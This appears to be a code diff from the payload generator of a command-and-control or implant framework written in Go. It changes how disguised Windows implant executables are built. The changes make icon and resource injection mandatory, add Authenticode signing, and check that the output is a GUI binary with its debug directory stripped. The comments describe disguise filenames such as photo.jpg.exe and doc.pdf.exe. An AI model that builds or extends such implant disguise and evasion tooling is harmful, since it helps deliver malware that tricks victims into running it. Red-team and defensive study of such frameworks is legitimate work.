@@ -3,6 +3,7 @@ package payload
 import (
 	"archive/zip"
 	"bytes"
+	"debug/pe"
 	"fmt"
 	"os"
 	"path/filepath"
@@ -54,13 +55,6 @@ func GenerateWindowsEXE(cfg ImplantConfig, outputDir string) (string, error) {
 
 	ldflags, blob, sKey := buildLdflags(cfg, profile, "windows")
 
-	// Windows icon / disguise handling (must be before go mod tidy so rsrc.syso is in tmpDir)
-	if err := injectIconResource(tmpDir, cfg); err != nil {
-		// Log but do not fail build — default Go icon is acceptable
-		// Use fmt for now to avoid import cycle; slog available via log/slog
-		fmt.Printf("icon injection warning: %v\n", err)
-	}
-
 	// Output filename — honor disguise: photo.jpg.exe / doc.pdf.exe / ...
 	outName := cfg.Filename
 	if outName == "" {
@@ -73,6 +67,25 @@ func GenerateWindowsEXE(cfg ImplantConfig, outputDir string) (string, error) {
 	// Strip any directory components so a user-supplied filename containing
 	// ".." or an absolute path cannot write outside outputDir (A1).
 	outName = safeBuildFileName(outName)
+
+	// Windows icon / disguise handling (must be before go mod tidy so rsrc.syso
+	// is in tmpDir). A requested icon/preset/disguise that cannot be embedded
+	// is a build failure: silently shipping the default Go icon would defeat
+	// the operator's explicit choice.
+	resourceName := cfg.OriginalFilename
+	if resourceName == "" {
+		if cfg.Filename == "" {
+			// Direct generator callers that let the server pick an output name
+			// must not leak the internal build name into VersionInfo.
+			resourceName = "agent.exe"
+		} else {
+			resourceName = outName
+		}
+	}
+	if err := injectIconResource(tmpDir, cfg, resourceName); err != nil {
+		return "", fmt.Errorf("resource injection failed: %w", err)
+	}
+
 	outPath, buildPath, err := prepareBuildOutput(outputDir, outName)
 	if err != nil {
 		return "", err
@@ -106,9 +119,22 @@ func GenerateWindowsEXE(cfg ImplantConfig, outputDir string) (string, error) {
 		}
 	}
 
+	// Authenticode signing runs on the final bytes: after UPX (which rewrites
+	// the image) and after self-check (which is rejected in combination with
+	// signing). Validation below therefore covers exactly what is delivered.
+	if err := signPEIfRequested(buildPath, cfg); err != nil {
+		return "", err
+	}
+
 	// Fail loudly (rather than deliver a corrupt binary) if the produced exe is
-	// malformed or the wrong architecture.
-	if err := validatePE(buildPath, windowsMachine(goarch)); err != nil {
+	// malformed, is not a GUI executable, still carries a debug directory, or
+	// is the wrong architecture.
+	if err := validatePEWith(buildPath, peExpect{
+		Machine:             windowsMachine(goarch),
+		Signed:              cfg.CodeSigningEnabled(),
+		RequireDebugCleared: true,
+		Subsystem:           pe.IMAGE_SUBSYSTEM_WINDOWS_GUI,
+	}); err != nil {
 		return "", fmt.Errorf("generated exe failed PE validation: %w", err)
 	}
 
